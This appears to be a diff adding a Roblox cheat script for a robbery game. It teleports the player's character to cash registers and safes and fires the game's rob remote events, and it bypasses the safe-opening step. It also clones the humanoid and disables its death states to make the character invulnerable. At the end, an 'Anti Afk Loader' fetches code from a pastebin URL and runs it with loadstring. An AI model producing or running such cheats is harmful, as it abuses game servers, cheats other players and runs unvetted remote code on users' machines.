@@ -1,0 +1,110 @@
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+
+local localPlayer = Players.LocalPlayer
+local camera = Workspace.CurrentCamera
+local character = localPlayer.Character or localPlayer.CharacterAdded:Wait() 
+local humanoid = character:FindFirstChildWhichIsA("Humanoid")
+
+
+local bag = localPlayer:WaitForChild("States"):WaitForChild("Bag")
+local bagSizeLevel = localPlayer:WaitForChild("Stats"):WaitForChild("BagSizeLevel"):WaitForChild("CurrentAmount")
+local robEvent = ReplicatedStorage:WaitForChild("GeneralEvents"):WaitForChild("Rob")
+local humanoidRootPart = character.HumanoidRootPart
+
+local targetPosition = CFrame.new(1636.62537, 104.349976, -1736.184)
+
+
+local function moveToTarget()
+    humanoidRootPart.CFrame = targetPosition
+end
+
+
+local function checkCashRegister()
+    for _, item in ipairs(Workspace:GetChildren()) do
+        
+        if bag.Value == bagSizeLevel.Value then
+            moveToTarget() 
+            break
+        elseif item:IsA("Model") and item.Name == "CashRegister" then
+            local openPart = item:FindFirstChild("Open")
+            if openPart then
+                humanoidRootPart.CFrame = openPart.CFrame
+                robEvent:FireServer("Register", {
+                    Part = item:FindFirstChild("Union"),
+                    OpenPart = openPart,
+                    ActiveValue = item:FindFirstChild("Active"),
+                    Active = true
+                })
+                return true 
+            end
+        end
+    end
+    return false
+end
+
+
+local function checkSafe()
+    for _, item in ipairs(Workspace:GetChildren()) do
+        
+        if bag.Value == bagSizeLevel.Value then
+            moveToTarget() 
+            break
+        elseif item:IsA("Model") and item.Name == "Safe" and item:FindFirstChild("Amount").Value > 0 then
+            local safePart = item:FindFirstChild("Safe")
+            if safePart then
+                humanoidRootPart.CFrame = safePart.CFrame
+                if item:FindFirstChild("Open").Value then
+                    robEvent:FireServer("Safe", item)
+                else
+                    item:FindFirstChild("OpenSafe"):FireServer("Completed")
+                    robEvent:FireServer("Safe", item)
+                end
+                return true 
+            end
+        end
+    end
+    return false
+end
+
+
+if humanoid then
+    local clonedHumanoid = humanoid:Clone()
+    clonedHumanoid.Parent = character
+    localPlayer.Character = nil
+    clonedHumanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
+    clonedHumanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
+    clonedHumanoid:SetStateEnabled(Enum.HumanoidStateType.Physics, false)
+    humanoid:Destroy()
+    localPlayer.Character = character
+    camera.CameraSubject = clonedHumanoid
+    camera.CFrame = camera.CFrame
+    clonedHumanoid.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
+
+    
+    local animate = character:FindFirstChild("Animate")
+    if animate then
+        animate.Disabled = true
+        task.wait() 
+        animate.Disabled = false
+    end
+
+    clonedHumanoid.Health = clonedHumanoid.MaxHealth
+end
+
+
+task.wait(2)
+
+
+RunService.RenderStepped:Connect(function()
+    if not checkCashRegister() then
+        checkSafe()
+    end
+end)
+
+-- Anti Afk Loader
+task.spawn(function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/tCdZnHui", true))()
+end)
